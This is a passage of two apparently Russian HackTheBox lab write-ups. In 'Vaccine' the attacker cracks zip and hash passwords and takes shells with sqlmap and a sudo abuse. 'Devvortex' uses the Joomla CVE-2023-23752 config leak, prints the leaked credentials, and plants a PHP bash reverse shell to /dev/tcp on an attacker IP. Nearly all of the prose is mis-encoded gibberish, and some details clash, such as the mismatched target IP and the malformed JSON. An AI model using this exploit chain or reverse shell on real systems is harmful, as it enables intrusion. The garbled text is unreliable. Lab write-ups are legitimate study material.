—Å–ª–µ–¥—É—é—â–∏–π —Ä–∞–∑, –µ—Å–ª–∏ –º—ã —Å—Ç–æ–ª–∫–Ω–µ–º—Å—è —Å –≤ –¥—Ä—É–≥–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏, –ø–æ—Ö–æ–∂–µ–π –Ω–∞ —ç—Ç—É, –º—ã –º–æ–∂–µ–º –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ, –∏ –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç, –º—ã –º–æ–∂–µ–º –∏—Å–∫–ª—é—á–∏—Ç—å —ç—Ç–æ –∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –¥—Ä—É–≥–∏–µ –º–µ—Ç–æ–¥—ã.

---

# Vaacine

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

![[Pasted image 20230723042921.png]]

Vaccine - —ç—Ç–æ –±–µ—Å–ø–ª–∞—Ç–Ω–∞—è –º–∞—à–∏–Ω–∞ –≤ hackthebox, –≤–∞–∫—Ü–∏–Ω–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –≤–∑–ª–æ–º –ø–∞—Ä–æ–ª—è, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã cookie –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –ø–æ–ª—É—á–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ —Å –ø–æ–º–æ—â—å—é SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ –∏, –Ω–∞–∫–æ–Ω–µ—Ü, –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –¥–æ root.

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

![[Pasted image 20230723042950.png]]

–ú–∞—à–∏–Ω–∞ –∏–º–µ–µ—Ç 3 –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞:

21 => FTP (VSTFP 3.0.3)

22 => ssh (Openssh 8.0p1)

80 => http (Apache http 2.4.41)

## –î–æ—Å—Ç—É–ø –∫ FTP

![[Pasted image 20230723043101.png]]

–í—Ö–æ–¥ —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º: Anonymous Pass: Anonymous

–û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã ls -la

![[Pasted image 20230723043120.png]]

–ó–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ–∑–µ—Ä–≤–Ω—É—é backup.zip —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã FTP (GET)

![[Pasted image 20230723043245.png]]

–†–∞–∑–∞—Ä—Ö–∏–≤–∏—Ä—É–π—Ç–µ —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é —Ñ–∞–π–ª–∞.zip

![[Pasted image 20230723044002.png]]

## –í–∑–ª–æ–º –ø–∞—Ä–æ–ª—å –æ—Ç –∞—Ä—Ö–∏–≤–∞ 

–í–∑–ª–æ–º–∞—Ç—å –ø–∞—Ä–æ–ª—å —Å –ø–æ–º–æ—â—å—é –î–∂–æ–Ω–∞ –ü–æ—Ç—Ä–æ—à–∏—Ç–µ–ª—è

![[Pasted image 20230723044019.png]]

–°–Ω–æ–≤–∞ —Ä–∞—Å–ø–∞–∫—É–π—Ç–µ —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é —Ñ–∞–π–ª–∞.zip –∏—Å–ø–æ–ª—å–∑—É—è –ø–∞—Ä–æ–ª—å:741852963

![[Pasted image 20230723044054.png]]

–í zip-—Ñ–∞–π–ª–µ –µ—Å—Ç—å 2 —Ñ–∞–π–ª–∞: index.php style.css, –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏–º index.php —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã cat.

![[Pasted image 20230723044113.png]]

## –í–∑–ª–æ–º —Ö–µ—à–∞

–í–∑–ª–æ–º–∞—Ç—å –ø–∞—Ä–æ–ª—å —Å –ø–æ–º–æ—â—å—é Hashcat

![[Pasted image 20230723044139.png]]

–û—Ç–∫—Ä–æ–π—Ç–µ IP-–∞–¥—Ä–µ—Å –≤ –±—Ä–∞—É–∑–µ—Ä–µ

![[Pasted image 20230723044158.png]]

–í–æ–π–¥–∏—Ç–µ –≤ —Å–∏—Å—Ç–µ–º—É —Å –ø–æ–º–æ—â—å—é User:Admin Pass:Qwerty789

![[Pasted image 20230723044214.png]]

## –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ SQLi

–í –ø–æ–∏—Å–∫–æ–≤–æ–π —Å—Ç—Ä–æ–∫–µ –≤–≤–µ–¥–∏—Ç–µ ¬´—Å–ø–æ—Ä—Ç¬ª

![[Pasted image 20230723044232.png]]

–í URL-–∞–¥—Ä–µ—Å–µ –µ—Å—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä ?search=sports add single quote to identify error.

![[Pasted image 20230723044304.png]]

–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ SQLMap, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å—é SQL-–∏–Ω—ä–µ–∫—Ü–∏—è, —Å–Ω–∞—á–∞–ª–∞ –¥–∞–≤–∞–π—Ç–µ –Ω–∞–π–¥–µ–º —Å–µ–∞–Ω—Å cookies, —á—Ç–æ–±—ã —â–µ–ª–∫–Ω—É—Ç—å –ø—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –º—ã—à–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –∏ –≤—ã–±—Ä–∞—Ç—å –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —ç–ª–µ–º–µ–Ω—Ç -> —Ö—Ä–∞–Ω–∏–ª–∏—â–µ -> PHPSESID –¥–æ–ª–∂–µ–Ω –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.

![[Pasted image 20230723044332.png]]

–î–∞–≤–∞–π—Ç–µ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è –Ω–∞—à–∏–º sqlmap, —á—Ç–æ–±—ã –æ–±—ä–µ–¥–∏–Ω–∏—Ç—å SQL-–∏–Ω—ä–µ–∫—Ü–∏—é + –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã ‚Äî os-shell.

![[Pasted image 20230723044349.png]]

![[Pasted image 20230723044357.png]]

–¢–µ–ø–µ—Ä—å –æ—Ç–∫—Ä–æ–π—Ç–µ –Ω–æ–≤—ã–π —Ç–µ—Ä–º–∏–Ω–∞–ª –∏ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É.

![[Pasted image 20230723044415.png]]

–í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –æ–±–æ–ª–æ—á–∫—É sqlmap –∏ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É.

![[Pasted image 20230723044430.png]]

–¢–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ —Å–¥–µ–ª–∞–µ–º –æ–±–æ–ª–æ—á–∫—É —Å—Ç–∞–±–∏–ª—å–Ω–æ–π, –∏—Å–ø–æ–ª—å–∑—É—è:

![[Pasted image 20230723044444.png]]

## –ü–æ–ª—É—á–∏—Ç—å —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

![[Pasted image 20230723044456.png]]

–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º, –≤—ã –ø–æ–ª—É—á–∏–ª–∏ —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

## –ü—Ä–∏–≤–∏–ª–µ–≥–∏—á–µ—Å–∫–∞—è —ç—Å–∫–∞–ª–∞—Ü–∏—è

![[Pasted image 20230723044515.png]]

–ü–æ–¥–∫–ª—é—á–∏–º SSH –∫ –º–∞—à–∏–Ω–µ

![[Pasted image 20230723044529.png]]

![[Pasted image 20230723044537.png]]

–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –∫–∞–∂–µ—Ç—Å—è, —á—Ç–æ –º—ã –º–æ–∂–µ–º —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å pg_hba.conf —Å –ø–æ–º–æ—â—å—é —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ VI.

![[Pasted image 20230723044551.png]]

–ú—ã –º–æ–∂–µ–º –ø–æ–≤—ã—Å–∏—Ç—å –Ω–∞—à–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É.

![[Pasted image 20230723044612.png]]

–¢–µ–ø–µ—Ä—å –ø–æ–ª—É—á–∞–µ–º –æ–±–æ–ª–æ—á–∫—É.

![[Pasted image 20230723044625.png]]

![[Pasted image 20230723044633.png]]

–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º, –≤—ã –ø–æ–ª—É—á–∏–ª–∏ –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥.

---

# Devvortex

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

–•–º‚Ä¶.¬†Devvortex, –µ—â–µ –æ–¥–Ω–∞ –º–∞—à–∏–Ω–∞, –æ—Ç–Ω–µ—Å–µ–Ω–Ω–∞—è –∫ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ ¬´–ø—Ä–æ—Å—Ç—ã—Ö¬ª, –Ω–æ –ø–æ—è–≤–∏–≤—à–∞—è—Å—è –≤—Å–µ–≥–æ 1 –¥–µ–Ω—å –Ω–∞–∑–∞–¥.¬†–õ–∏—á–Ω–æ –º–Ω–µ —ç—Ç–æ –ø–æ–∫–∞–∑–∞–ª–æ—Å—å –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç—ã–º, –ø–æ—ç—Ç–æ–º—É –ø–æ–∑–≤–æ–ª—å—Ç–µ –º–Ω–µ –ø—Ä–æ–≤–µ—Å—Ç–∏ –≤–∞—Å —á–µ—Ä–µ–∑ —ç—Ç–æ—Ç ¬´–∑–∞–±—Ä–æ—à–µ–Ω–Ω—ã–π¬ª —Å–µ—Ä–≤–µ—Ä.

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ 

```bash
# Nmap 7.94 scan initiated Wed Dec  6 12:30:49 2023 as: nmap -v -sC -sV -oN nmap/10.10.11.242 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  6 12:32:05 2023 -- 1 IP address (1 host up) scanned in 75.89 seconds
```

–ö–ª—é—á–µ–≤—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã:

- SSH (–ø–æ—Ä—Ç 22): OpenSSH 8.2p1 –≤ Ubuntu.
- HTTP (–ø–æ—Ä—Ç 80): Nginx 1.18.0 –≤ Ubuntu, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ http://devvortex.htb/.

IP-–∞–¥—Ä–µ—Å –∏ –¥–æ–º–µ–Ω –±—ã–ª–∏ –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ /etc/hosts:

```python
echo "10.10.14.242 devvortex.htb" | sudo tee -a /etc/hosts
```

## –ù–∞—á–∞–ª—å–Ω–∞—è —Ç–æ—á–∫–∞ –æ–ø–æ—Ä—ã

–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ devvortex.htb –ø–æ–Ω–∞—á–∞–ª—É –æ–∫–∞–∑–∞–ª–æ—Å—å –±–µ–∑—Ä–µ–∑—É–ª—å—Ç–∞—Ç–Ω—ã–º.

![[Pasted image 20240223225131.png]]

–ü–µ—Ä–≤—ã–º –≤–∞–∂–Ω—ã–º —à–∞–≥–æ–º –±—ã–ª–æ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –∫–∞—Ç–∞–ª–æ–≥–æ–≤ —Å –ø–æ–º–æ—â—å—é Gobuster:

```python
gobuster dir -u http://devvortex.htb/ -w $wordlists/content/dirs-and-files-medium.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /Users/mekaneo/Hacking/wordlists/content/dirs-and-files-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/12/08 17:32:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
===============================================================
2023/12/08 17:32:51 Finished
===============================================================
```

–ù–∏—á–µ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–≥–æ –Ω–µ –Ω–∞—à–µ–ª.¬†–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø–æ–¥–¥–æ–º–µ–Ω–æ–≤ DNS –≤—ã—è–≤–∏–ª–æ dev.devvortex.htb:

```python
gobuster dns -d devvortex.htb -w $wordlists/dns/subdomains-top1million-20000.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    20
[+] Timeout:    1s
[+] Wordlist:   /Users/mekaneo/Hacking/wordlists/dns/subdomains-top1million-20000.txt
===============================================================
2023/12/08 17:37:57 Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 1013 / 19967 (5.07%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/12/08 17:38:02 Finished
===============================================================
```

**–ù–∞–π–¥–µ–Ω–æ: dev.devvortex.htb**

–Ø –¥–æ–±–∞–≤–∏–ª –µ–≥–æ –≤ —Å–≤–æ–π¬†¬†**/etc/hosts**¬†¬†–∏ –ø—Ä–∏—Å—Ç—É–ø–∏–ª –∫ –∏–∑—É—á–µ–Ω–∏—é —ç—Ç–æ–≥–æ —Å–∞–π—Ç–∞.¬†–ù–∞–∂–∞—Ç–∏–µ –Ω–∞ /robots.txt —Ä–∞—Å–∫—Ä—ã–ª–æ –µ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏ —Å—Ç–∞–ª–æ —è—Å–Ω–æ: —ç—Ç–æ CMS Joomla.

![[Pasted image 20240223225214.png]]

–ò–ª–∏ –º–æ–∂–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å gobuster –∏–ª–∏ dirb –¥–ª—è –ø–æ–∏—Å–∫–∞ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤. –ò —Ç–∞ –∏ –¥—Ä—É–≥–∞—è –ø—Ä–∏–≤–æ–¥–∏—Ç—å –Ω–∞—Å –∫ –∫–∞—Ç–∞–ª–æ–≥—É /administrator

![[Pasted image 20240223230642.png]]

–û–≥–æ.. –ø–æ–¥–æ–∂–¥–∏ –º–∏–Ω—É—Ç–∫—É..¬†`/administrator`?¬†–î–∞–≤–∞–π—Ç–µ –ø–æ–≥—Ä—É–∑–∏–º—Å—è.

![[Pasted image 20240223225227.png]]

–ê–∞–∞.. –º–∏–ª–∞—è¬†—É –Ω–∞—Å¬†**Joomla .. –ß—Ç–æ –º—ã –º–æ–∂–µ–º —Å–∫–∞–∑–∞—Ç—å?** –ü–æ–ø—ã—Ç–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–±—â–∏–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≤—Ö–æ–¥–∞ –≤ Joomla –Ω–µ —É–≤–µ–Ω—á–∞–ª–∏—Å—å —É—Å–ø–µ—Ö–æ–º.

## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–ü–æ—á–µ–º—É –±—ã –Ω–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å¬†Joomscan¬†[,](https://www.kali.org/tools/joomscan/)`dev.devvortex.htb`¬†–≤–æ–∑–º–æ–∂–Ω–æ, –º—ã —Å–º–æ–∂–µ–º –Ω–∞–π—Ç–∏ —á—Ç–æ-—Ç–æ –º–Ω–æ–≥–æ–æ–±–µ—â–∞—é—â–µ–µ.

![[Pasted image 20240223230732.png]]

## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è

–í–∞ –≤–∞ –≤–∏ –≤–∞–∞!!¬†**Joomla v. 4.2.6**¬†.¬†–≠—Ç–∞ –≤–µ—Ä—Å–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —É—è–∑–≤–∏–º–∞ –∫ –Ω–µ–¥–∞–≤–Ω–µ–º—É¬†[CVE-2023‚Äì23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)¬†(—ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö).¬†–ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—è –ò–Ω—Ç–µ—Ä–Ω–µ—Ç, —è –Ω–∞—Ç–∫–Ω—É–ª—Å—è –Ω–∞ –æ—á–µ–Ω—å —Ö–æ—Ä–æ—à–∏–π¬†[—ç–∫—Å–ø–ª–æ–π—Ç PoC](https://www.exploit-db.com/exploits/51334)¬†—Å¬†**—Å–∞–π—Ç–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞-db.com.** –í –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –º–æ–∂–µ—Ç–µ –Ω–∞–π—Ç–∏ –ø–æ–ª–Ω–æ —ç–∫—Å–ø–ª–æ—Ç–æ–≤ –¥–ª—è –¥–∞–Ω–Ω–æ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏.

–î–∞–≤–∞–π—Ç–µ –∑–∞–≥—Ä—É–∑–∏–º –∏ –∑–∞–ø—É—Å—Ç–∏–º –µ–≥–æ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Joomla.

![[Pasted image 20240223230821.png]]

–ò–ª–∏ –¥—Ä—É–≥–æ–π –ø—Ä–∏–º–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–∞:

**–ó–∞–ø—Ä–æ—Å**

```bash
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq .
```

**–û—Ç–≤–µ—Ç**

```json
{
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
}
```

–õ–∞–¥–Ω–æ, —ç—Ç–æ –±—ã–ª–æ –±—ã—Å—Ç—Ä–æ.¬†–£ –Ω–∞—Å –µ—Å—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö.¬†–î–æ–ª–∂–Ω—ã –ª–∏ –º—ã –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å¬†**SSH**¬†—Å –∑–∞–¥–∞–Ω–Ω—ã–º–∏ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏?¬†–ü—Ä–æ–±–æ–≤–∞–ª, –Ω–æ –±–µ–∑—É—Å–ø–µ—à–Ω–æ. –í –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤, —ç—Ç–∏ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–∑–≤–æ–ª–∏–ª–∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –ø–∞–Ω–µ–ª–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ Joomla:

![[Pasted image 20240223231113.png]]

–ë—É–º,¬†**–º—ã –≤ –¥–µ–ª–µ!**

–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã —É–≤–∏–¥–µ–ª–∏, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å¬†**lewis**¬†—è–≤–ª—è–µ—Ç—Å—è —Å—É–ø–µ—Ä–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —É –Ω–∞—Å –µ—Å—Ç—å –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –Ω–∞ –∫–æ–Ω—Ç–µ–Ω—Ç.¬†–ú—ã –º–æ–∂–µ–º –∏–∑–º–µ–Ω–∏—Ç—å¬†**PHP-**¬†–∫–æ–¥ —Ç–∞–∫ –∏ –≥–¥–µ —É–≥–æ–¥–Ω–æ.¬†–ù–∞—à–∞ —Å–ª–µ–¥—É—é—â–∞—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ ‚Äî –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É, –≥–¥–µ –º—ã –º–æ–∂–µ–º —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å¬†**PHP-**¬†–∫–æ–¥ –∏ –ø–æ–ª—É—á–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –Ω–∞ –Ω–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ.¬†–í Joomla —Ç–∞–∫—É—é ‚Äã‚Äã—Å—Ç—Ä–∞–Ω–∏—Ü—É –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤–Ω—É—Ç—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö —à–∞–±–ª–æ–Ω–æ–≤.¬†–î–ª—è —ç—Ç–æ–≥–æ –Ω–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å¬†**–°–∏—Å—Ç–µ–º–∞ -> –®–∞–±–ª–æ–Ω—ã -> –®–∞–±–ª–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.**

–û—Ç—Å—é–¥–∞ —è –ø–æ–Ω—è–ª, —á—Ç–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PHP-–∫–æ–¥–∞ –ª–µ–≥–∫–æ –∏ —Ç—Ä–µ–±—É–µ—Ç —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —à–∞–±–ª–æ–Ω–∞.¬†–Ø –∑–∞—à–µ–ª –≤¬†**–°–∏—Å—Ç–µ–º–∞**¬†->¬†**–®–∞–±–ª–æ–Ω—ã**¬†->¬†**–®–∞–±–ª–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞**¬†->¬†**index.php.**

–ö–∞–∫ –º—ã –≤–∏–¥–∏–º, –≤–Ω—É—Ç—Ä–∏ –Ω–∞—à–µ–≥–æ —à–∞–±–ª–æ–Ω–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ¬†**PHP-**¬†–∫–æ–¥–æ–≤. –î–∞–≤–∞–π—Ç–µ –æ—Ç–∫—Ä–æ–µ–º –ª—é–±–æ–π –∏–∑ –Ω–∏—Ö –∏ –≤–Ω–µ–¥—Ä–∏–º –Ω–∞—à –∫–æ–¥ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã bash –∏¬†**—Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è**¬†–∏–∑–º–µ–Ω–µ–Ω–∏–π.

![[Pasted image 20240223231221.png]]

–ó–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å netcat –Ω–∞ —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ, –∑–∞–π–¥–∏—Ç–µ¬†`http://dev.devvortex.htb/administrator/templates/atum/login.php` –∏–ª–∏ index.php –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –∫—É–¥–∞ –≤—ã –≤–Ω–µ–¥—Ä–∏–ª–∏ –∫–æ–¥ –∏ –¥–æ–∂–¥–∏—Ç–µ—Å—å —Å–ª–∞–¥–∫–æ–π –æ–±–æ–ª–æ—á–∫–∏.

–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ PHP –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —à–∞–±–ª–æ–Ω–∞:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
```

–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –ø–æ–º–æ—â—å—é netcat:

```bash
nc -l 4444
```

![[Pasted image 20240224001811.png]]

–°—É–ø–µ—Ä!¬†–£ –Ω–∞—Å –µ—Å—Ç—å –æ–±–æ–ª–æ—á–∫–∞.¬†–ü—Ä–æ–≤–µ—Ä—å—Ç–µ¬†`/etc/passwd`—Ñ–∞–π–ª, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –∫–∞–∫–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –º—ã –¥–æ–ª–∂–Ω—ã —Å–Ω–∞—á–∞–ª–∞ –ø–æ–≤—ã—Å–∏—Ç—å –Ω–∞—à–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏, –∞ —Ç–∞–∫–∂–µ –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏–º¬†`/home`–∫–∞—Ç–∞–ª–æ–≥, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –¥–∞—Ç—å –Ω–∞–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ.

![[Pasted image 20240224001827.png]]

